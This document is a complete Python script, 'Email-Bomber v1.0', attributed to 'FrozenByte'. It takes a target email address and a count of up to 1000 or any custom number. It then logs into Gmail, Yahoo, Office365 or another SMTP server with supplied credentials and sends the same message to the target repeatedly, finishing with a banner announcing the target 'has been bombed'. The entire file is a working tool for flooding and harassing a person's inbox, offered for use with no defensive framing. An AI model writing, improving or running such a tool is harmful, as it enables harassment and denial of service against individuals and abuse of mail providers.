'''imports'''
import smtplib
import sys
import email.message
#This email will not contain any headers and will likely go into the junk folder
def banner():
    print('------------------- +[+[+[+[ Email-Bomber v1.0 ]+]+]+]------------------- ')
    print('------------------- +[+[+[ made by FrozenByte ]+]+]+]------------------- ')
    print('''            
             . . .                    
              \|/                                                              
            `--+--'                   ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓       
              /|\                     ▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒             
             ' | '                    ▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░                
               |                      ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░             
               |                      ░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒          
           ,--'#`--.                  ░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░         
           |#######|                   ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░        
        _.-'#######`-._                  ░   ░      ░     ░   ▒    ▒ ░  ░ ░             
     ,-'###############`-.               ░  ░       ░         ░  ░ ░      ░  ░         
   ,'#####################`,                                                                  
  /#########################\          ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███      
 |###########################|        ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒    
|#############################|       ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒        
|#############################|       ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄     
|#############################|       ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒    
|#############################|       ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░     
 |###########################|        ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░      
  \#########################/          ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░     
   `.#####################,'           ░          ░ ░         ░    ░         ░  ░   ░        
     `._###############_,'                 
        `--..#####..--'                                                    .-.--.'`*
              ___________________________________________________________,'by: FrozenByte ''')
    
class Email_Bomber:
    
    def __init__(self):
        try:
            print('------------------- +[+[+[+[ Initializing.... ]+]+]+]------------------- ')
            self.toAddr = str(input("Target email address <: "))
            self.mode = int(input("Choose an option for number of emails to send ?\n1:250\n2:500\n3:1000\n4:For custom amount\n"))
            
        except Exception as e:
            print(f"ERROR: {e}")
            sys.exit(1)        
            
    def bomb(self):        
        if self.mode == int(1):
            self.mode = int(250)
        elif self.mode ==int(2):
            self.mode =int(500)
        elif self.mode == int(3):
            self.mode = int(1000)
        else:
            self.mode = int(input("How many emails do you want to send? <:"))
        print(f"fantastic, you are going to send a total of {self.mode} emails")
                
    def email(self):
        try:
            print('\n-----------------+[+[+[ Setting up From details +]+]+]-----------------')
            self.fromAddr = str(input("From address <: "))
            self.passwd = str(input("Type your password <: "))
                
            self.server = int(input("\nEnter email server | or select premade options - 1:Gmail 2:Yahoo 3:Hotmail 4:Other<:  "))
            premade = [1,2,3,4]
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input("\nEnter SMTP server and port number <: "))
                        
            if default_port == True:
                self.port = int(587)
                        
            if self.server == int(1):
                self.server = "smtp.gmail.com"
            elif self.server == int(2):
                self.server = "smtp.mail.yahoo.com"
            elif self.server == int(3):
                self.server = "smtp.office365.com"
            elif self.server == int(4):
                self.server = "smtp.hostinger.com"                
                    
        except Exception as e:
            print(f'ERROR: {e}')
                
    def message(self):
        try:
            print('\n-----------------+[+[+[ Setting up Message +]+]+]-----------------')            
            self.subject = str(input("Email Subject: <: "))
            self.msg = str(input("Type your message: <: "))
            #--------Brain of mail bomber
            m = email.message.Message()
            m["from"] = self.fromAddr
            m["to"] = self.toAddr
            m["Subject"] = self.subject
            
            m.set_payload(self.msg)
            self.msg = m.as_string()            
        except Exception as e:
            print(f'ERROR: {e}')        

    def backend(self):
        try:
            self.s = smtplib.SMTP(self.server, self.port)
            self.s.starttls()
            self.s.login(self.fromAddr,self.passwd)
            print("logged in successfully")
        except Exception as e:
            print("failed to login into server.")
        
    def attack(self):
        for each in range(self.mode+1):
            try:
                self.s.sendmail(self.fromAddr,self.toAddr,self.msg)
                print(f'BOMB: {each} sent')
            except Exception as e:
                print(f'ERROR: {e}')
        print(f'''
                               ____
                       __,-~~/~    `---.
                     _/_,---(      ,    )
                  __/        <    /   )  \___
- ------==;;;'===---{self.toAddr} has beeen bombed ----------===;;;===----- -  -
                   \/  ~"~"~"~"~"~\~"~)~"/
                  (_ (   \  (     >    \)
                   \_( _ <         >_>'
                      ~ `-i' ::>|--"
                          I;|.|.|
                         <|i::|i|`.
                        (` ^'"`-' ")
              ''')

if __name__ == '__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.message()
    bomb.backend()
    bomb.attack()    